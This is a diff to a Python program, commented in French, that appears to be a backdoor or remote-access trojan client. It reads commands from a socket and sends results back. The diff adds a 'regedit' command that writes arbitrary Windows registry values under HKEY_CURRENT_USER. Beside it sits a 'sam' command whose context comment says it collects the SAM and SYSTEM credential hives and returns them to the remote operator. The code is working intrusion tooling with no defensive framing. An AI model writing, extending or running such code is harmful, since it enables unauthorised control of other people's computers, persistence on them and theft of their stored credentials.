@@ -41,6 +41,14 @@ def main():
         if commande == "exit":
             break
 
+        elif commande.startswith("regedit "):
+            parts = commande.split(" ", 3)
+            if len(parts) == 4:
+                resultat = add_registry_key(parts[1], parts[2], parts[3])
+            else:
+                resultat = "Usage: regedit CHEMIN NOM VALEUR"
+            sock.send(resultat.encode())
+
         elif commande == "sam":
             resultat = dump_sam()
             sock.sendall(resultat.encode())
@@ -54,6 +62,18 @@ def main():
             sock.send(resultat.encode())
 
     sock.close()
+
+
+# ajoute une clef dans le registre windows
+def add_registry_key(chemin, nom, valeur):
+    try:
+        import winreg
+        clef = winreg.OpenKey(winreg.HKEY_CURRENT_USER, chemin, 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(clef, nom, 0, winreg.REG_SZ, valeur)
+        winreg.CloseKey(clef)
+        return f"Clef ajoutee: {chemin}\\{nom} = {valeur}"
+    except Exception as e:
+        return f"Erreur registre: {e}"
 
 
 # recupere les fichiers SAM et SYSTEM (faut etre admin)
